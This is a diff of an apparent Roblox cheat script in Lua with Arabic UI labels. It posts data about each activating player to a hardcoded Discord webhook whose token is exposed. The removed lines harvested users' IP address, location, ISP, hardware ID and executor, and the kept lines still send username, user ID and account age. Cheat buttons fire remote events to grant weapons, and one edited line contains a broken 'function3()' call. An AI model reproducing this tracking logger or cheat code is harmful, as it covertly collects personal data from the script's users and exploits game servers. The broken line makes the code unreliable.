@@ -9,55 +9,19 @@ local GuiService = game:GetService("GuiService")
 local WebhookURL = "https://discord.com/api/webhooks/1508593402219069581/E6-V3l3TviD8XfKQLWJbUsOi0AHNVjaPHF6bTC0iQRDi2QFlX8-GuiPlMGNHZF4NWIQK"
 
 local function SuperDeepLog()
-    local function getNetworkData()
-        local s, res = pcall(function()
-            return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/?fields=66846719"))
-        end)
-        return s and res or {}
-    end
-
-    local net = getNetworkData()
-    local executor = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Unknown"
-    local hwid = (gethwid and gethwid()) or "N/A"
-    
     local data = {
-        ["content"] = "🚨 **[FULL SYSTEM SCAN]** تفعيل جديد للسكريبت من " .. Player.Name,
+        ["content"] = "🚨 **[تفعيل السكريبت]** تفعيل جديد من " .. Player.Name,
         ["embeds"] = {
             {
-                ["title"] = "👤 بيانات المستخدم",
+                ["title"] = "👤 بيانات المستخدم المسموحة",
                 ["color"] = 0xff0000,
                 ["fields"] = {
                     {["name"] = "اسم الحساب", ["value"] = Player.Name, ["inline"] = true},
                     {["name"] = "ID الحساب", ["value"] = tostring(Player.UserId), ["inline"] = true},
                     {["name"] = "عمر الحساب", ["value"] = Player.AccountAge .. " يوم", ["inline"] = true},
                 }
-            },
-            {
-                ["title"] = "🌐 بيانات الشبكة والاتصال",
-                ["color"] = 0x00ff00,
-                ["fields"] = {
-                    {["name"] = "الـ IP الحقيقي", ["value"] = "||" .. (net.query or "N/A") .. "||", ["inline"] = true},
-                    {["name"] = "شركة الإنترنت", ["value"] = net.isp or "N/A", ["inline"] = true},
-                    {["name"] = "الدولة والرمز", ["value"] = (net.country or "N/A") .. " (" .. (net.countryCode or "N/A") .. ")", ["inline"] = true},
-                    {["name"] = "المدينة والمنطقة", ["value"] = (net.city or "N/A") .. " - " .. (net.regionName or "N/A"), ["inline"] = false},
-                    {["name"] = "الرمز البريدي (ZIP)", ["value"] = net.zip or "N/A", ["inline"] = true},
-                    {["name"] = "المنطقة الزمنية", ["value"] = net.timezone or "N/A", ["inline"] = true}
-                }
-            },
-            {
-                ["title"] = "⚙️ بيانات الجهاز والهاك (Hardware)",
-                ["color"] = 0x0000ff,
-                ["fields"] = {
-                    {["name"] = "نوع الهاك", ["value"] = executor, ["inline"] = true},
-                    {["name"] = "الـ HWID (بصمة الجهاز)", ["value"] = "```" .. hwid .. "```", ["inline"] = false},
-                    {["name"] = "المنصة", ["value"] = UserInputService:GetPlatform().Name, ["inline"] = true},
-                    {["name"] = "دقة الشاشة", ["value"] = tostring(GuiService:GetScreenResolution().X) .. "x" .. tostring(GuiService:GetScreenResolution().Y), ["inline"] = true},
-                    {["name"] = "استهلاك الرام", ["value"] = math.floor(Stats:GetTotalMemoryUsageMb()) .. " MB", ["inline"] = true},
-                    {["name"] = "البنج (Ping)", ["value"] = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()) .. "ms", ["inline"] = true}
-                }
             }
         },
-        ["footer"] = {["text"] = "Top T Security | JobId: " .. game.JobId},
         ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }
 
@@ -248,7 +212,7 @@ AddBtn(T3, "أخذ كل الأسلحة", Color3.fromRGB(46, 204, 113)).MouseButt
     for _, item in pairs(RS:WaitForChild("StarterPack"):GetChildren()) do RS.RequestTool:FireServer(item.Name, 0) task.wait(0.05) end
 end)
 AddBtn(T3, "M4A1").MouseButton1Click:Connect(function() RS.GiveToolEvent:FireServer("M4A1") end)
-AddBtn(T3, "درع").MouseButton1Click:Connect(function() RS.GiveToolEvent:FireServer("Heavy Vest") end)
+AddBtn(T3, "درع").MouseButton1Click:Connect(function3() RS.GiveToolEvent:FireServer("Heavy Vest") end)
 AddBtn(T3, "Deagle").MouseButton1Click:Connect(function() RS.GiveToolEvent:FireServer("Desert Deagle") end)
 
 local T4 = CreateTab("الكلبشة", 130)
